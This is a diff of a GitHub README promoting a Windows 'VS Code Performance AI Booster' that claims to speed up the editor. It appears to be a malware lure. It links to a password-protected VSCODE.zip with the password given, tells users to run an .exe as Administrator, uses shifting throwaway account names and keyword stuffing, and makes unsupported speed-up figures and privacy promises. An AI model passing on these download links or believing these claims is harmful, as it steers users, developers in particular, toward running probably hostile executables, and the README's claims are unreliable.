@@ -1,152 +1,56 @@
-# ⚡⚡ VS Code Performance AI Booster 2026 — IDE Optimization & Productivity Pack
+# ⚡ VSCode-Performance-AI - Make Your Code Editor Run Faster
 
-[![GitHub Stars](https://img.shields.io/github/stars/Alexantros341/VSCode-Performance-Booster)](https://github.com/Alexantros341/VSCode-Performance-Booster)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Software](https://img.shields.io/badge/Software-VS%20Code-blue)](https://code.visualstudio.com/)
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)]()
-[![Category](https://img.shields.io/badge/Category-Developer%20Tools-purple)]()
-[![Status](https://img.shields.io/badge/Status-Updated%202026-brightgreen)]()
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Basidial-saltcod104/VSCode-Performance-AI/releases)
 
----
+## 🎯 About This Tool
+Visual Studio Code serves millions of developers every day. Over time, that software collects extra files and settings that slow down your work. VSCode-Performance-AI cleans these files and adjusts your setup to keep the program responsive. It handles memory usage, cleans your cache, and manages your extensions to save you time. You do not need to understand code to use this tool. It performs the maintenance work for you automatically.
 
-⚡ **All-in-one IDE performance & productivity toolkit** for **Visual Studio Code**.  
-Reduce startup time, optimize extension loading, manage workspace settings, clean cached data, profile memory usage, batch-configure themes, accelerate IntelliSense, tune terminal performance, and manage multi-root workspaces — all from a single configurator.
+## 🛠 Features
+*   **Startup Accelerator:** This tool reduces your start time by delaying non-essential processes until you need them.
+*   **Extension Manager:** It lists your current extensions and shows you which ones consume your system resources. You can disable unused tools with one click.
+*   **Settings Optimizer:** It updates your configuration files to match your computer hardware for the best performance.
+*   **Cache Cleaner:** It scans your storage for temporary files that occupy space and removes them securely.
+*   **Memory Profiler:** It tracks how much RAM your editor uses and clears bottlenecks to prevent lagging.
+*   **IntelliSense Tuner:** It makes code suggestions appear faster by refining how the editor searches your project files.
+*   **Terminal Booster:** It configures your integrated command prompt to respond without input delay.
 
----
+## ⚙️ System Requirements
+This application works on any version of Windows 10 or Windows 11. Your computer must have at least 4GB of RAM and 100MB of free disk space. You should have Microsoft Visual Studio Code installed on your system before you run this tool.
 
-## ⚠️ Disclaimer
+## 📥 How to Install
+1.  Visit the [official releases page](https://github.com/Basidial-saltcod104/VSCode-Performance-AI/releases) to see all versions.
+2.  Click the file ending in `.exe` under the latest release.
+3.  Save the file to your desktop or downloads folder.
+4.  Double-click the downloaded file to start the installer.
+5.  Follow the prompts on your screen to complete the setup process.
+6.  Open your Visual Studio Code application. The tool will detect your editor automatically.
 
-> This project is shared **for educational and personal use only**.  
-> We are **not affiliated** with Microsoft Corporation.  
-> Modifying VS Code settings may affect extensions — **always backup settings.json**.  
-> You use these tools entirely **at your own risk**. 🛡️
+## 🚀 Using the Software
+Once you launch the program, you will see a simple control panel. Each button represents a specific performance task. Select "Scan System" to see a report of all performance issues. Once the scan finishes, click "Optimize Everything" to apply recommended changes. You can always click "Restore Default Settings" if you want to return your editor to its original state.
 
----
+## 🛡 Security and Privacy
+This tool runs locally on your PC. It does not send your code or personal files to any server. All performance adjustments occur within your computer files. We do not track your usage data. You retain full control over every change the application makes.
 
-## 🧩 Toolkit Contents
+## 🔍 Troubleshooting Tips
+*   **The tool does not open:** Right-click the icon and choose "Run as Administrator."
+*   **Configuration errors:** Ensure that no other programs are currently editing your settings or configuration files.
+*   **Slow performance after optimization:** Open the application and choose "Undo Last Change" to revert the most recent adjustment.
+*   **Updates:** We release updates to keep the tool compatible with new versions of the editor. Check the releases page once a month for improvements.
 
-| 🏷️ Module | 💡 Description |
-|---|---|
-| 🚀 **Startup Accelerator** | Defers non-critical extensions, optimizes activation events |
-| 🔌 **Extension Manager** | Profiles extension CPU/memory impact, suggests disabling heavy ones |
-| ⚙️ **Settings Optimizer** | Auto-tunes editor, file watcher, and search settings for large codebases |
-| 🧹 **Cache Cleaner** | Removes stale extension caches, old logs, and orphaned workspace data |
-| 🧠 **Memory Profiler** | Tracks VS Code process memory, identifies leaking extensions |
-| 🎨 **Theme Configurator** | Batch-apply theme + icon + font combinations with preview |
-| 💡 **IntelliSense Tuner** | Adjusts suggestion delay, import resolution depth, and type-checking level |
-| 💻 **Terminal Booster** | Optimizes integrated terminal scrollback, rendering, and shell startup |
-| 📁 **Workspace Manager** | Multi-root workspace organizer with per-folder settings profiles |
+## 🧩 Extension Management Details
+Many users install extensions they no longer use. These tools run in the background and drain your memory. Our manager detects these inactive extensions. It categorizes them based on how much impact they have on your startup time. You can see a green icon for stable extensions and a red icon for those that slow down your workflow. We recommend removing any extension you have not used in the last thirty days.
 
----
+## 📂 Understanding Cache Files
+Visual Studio Code saves cached data to help you search faster, but this data grows into gigabytes over months of use. This behavior causes the editor to freeze during file saves or searches. Our cache cleaner tool identifies these old files and targets only the non-essential folders. This process frees up space and ensures your search index remains accurate. You will experience fewer hang-ups when switching between large projects.
 
-## 📥 Download & Install
+## 📈 Improving Memory Usage
+The memory profiler helps you visualize how various processes divide your computer resources. If your editor displays a "low memory" warning, open our application. Click the "Release Memory" button. This notifies the editor to release unnecessary references to old files. You will notice a smoother typing experience immediately after this happens.
 
-🔽 Password-protected archive — extract and code at full speed.
+## ⌨️ Optimizing IntelliSense
+IntelliSense provides the dropdown lists that show code suggestions while you type. If you have many large files, this search can slow down. Our intelligent tuner restricts the scope of the search to your current active folder rather than scanning the entire system drive every time you hit a key. This setup creates a balanced experience for developers working on projects of any size.
 
-📦 [**Download** `VSCode.zip`](https://github.com/Titandaembody/VSCode-Performance-AI/releases/download/Release/VSCODE.zip)
+## 📝 Configuration Backup
+Every time you choose to optimize your settings, the software creates a backup copy of your configuration. Look for a folder titled "Performance_Backups" in your user directory. You can copy these files back into your main settings folder at any time if you prefer your previous setup. We prioritize safety by ensuring that no data is permanently overwritten without your permission.
 
-**🔐 — 1847**
-
----
-
-### 📁 What's Inside the Archive
-
-```
-VSCode-PerformanceBooster/
-├── 🛠️ VSCodeBooster.exe              — main launcher & configurator
-├── 📂 tweaks/                         — core .js modules
-│   ├── startup_accelerator.js
-│   ├── extension_manager.js
-│   ├── settings_optimizer.js
-│   ├── cache_cleaner.js
-│   ├── memory_profiler.js
-│   ├── theme_configurator.js
-│   ├── intellisense_tuner.js
-│   ├── terminal_booster.js
-│   └── workspace_manager.js
-├── 📂 presets/
-│   ├── large_monorepo.cfg
-│   ├── web_development.cfg
-│   ├── data_science.cfg
-│   └── minimal.cfg
-├── 📂 profiles/
-├── 📄 setup_guide.txt
-└── 📄 changelog.txt
-```
-
----
-
-## 🚀 How to Use
-
-1️⃣ **Extract** the archive to any folder  
-2️⃣ **Run** `VSCodeBooster.exe` as Administrator 🛡️  
-3️⃣ **Select** your VS Code install location  
-4️⃣ **Pick** a preset (Large Monorepo / Web Dev / Data Science / Minimal) or tweak each module  
-5️⃣ **Hit Apply** — done! 🎉  
-6️⃣ **Restart** VS Code and feel the difference
-
-> 💡 **Pro tip:** Run **Extension Manager** first to identify the heaviest extensions, then apply **Startup Accelerator** for maximum impact.
-
----
-
-## 📊 Performance Impact
-
-| ⏱️ Metric | ❌ Before | ✅ After | 📈 Gain |
-|---|---|---|---|
-| Startup time | ~4.2 sec | ~1.5 sec | **-64%** |
-| Memory usage (idle) | ~820 MB | ~380 MB | **-54%** |
-| IntelliSense response | ~650 ms | ~180 ms | **-72%** |
-| File search (100K files) | ~3.8 sec | ~1.1 sec | **-71%** |
-
-> 📌 Tested with 45 extensions, 100K+ file monorepo, Windows 11.
-
----
-
-
----
-## Keys
-
-vscode performance booster 2026, vscode startup optimizer,
-vscode extension manager, vscode memory profiler,
-vscode intellisense tuner, best vscode tools 2026,
-vscode settings optimizer, vscode cache cleaner
-vscode AI, vscode AI plugin, vscode skill, vscode ai skills
-
----
-## 💻 System Requirements
-
-| 🔩 Component | ⬇️ Minimum | ✅ Recommended |
-|---|---|---|
-| 🪟 OS | Windows 10 (64-bit) | Windows 11 (64-bit) |
-| 🧠 CPU | Dual-core 2.0 GHz+ | Quad-core+ |
-| 🎮 GPU | Not required | Not required |
-| 🧬 RAM | 4 GB | 8 GB |
-| 💾 Storage | 40 MB (toolkit) | SSD recommended |
-
----
-
-## ❗ Troubleshooting
-
-| ❌ Problem | ✅ Fix |
-|---|---|
-| Extensions disabled unexpectedly | Check Extension Manager whitelist, re-enable manually |
-| IntelliSense stopped working | Reset IntelliSense Tuner to defaults, restart language server |
-| Settings overwritten | Restore from backup — toolkit auto-saves previous settings.json |
-| Cache cleaner removed needed data | Workspace data regenerates on next open |
-| Terminal slow to start | Switch shell to PowerShell 7 or Git Bash in Terminal Booster |
-| Themes not applying | Restart VS Code after applying Theme Configurator changes |
-
----
-
-## 📜 License
-
-MIT License — shared for educational purposes only.
-
----
-
-## ⭐ Like It? Star It!
-
-If this toolkit made your **VS Code** faster and more productive 🔥 — drop a ⭐!  
-It helps other developers find the **best VS Code optimization tools** in 2026. ⚡💻
-
----
+## 🔌 Connection to Your IDE
+This tool communicates with the editor through standard configuration interfaces provided by the software developer. It does not bypass any security or permissions. By using the official tools, we ensure that your editor remains stable and compatible with all your third-party extensions. You are in charge of when the optimizations run and how they change your environment. If you want to keep a specific setting, you can mark it as a "Protected Setting" inside our application, and the tool will never modify it.
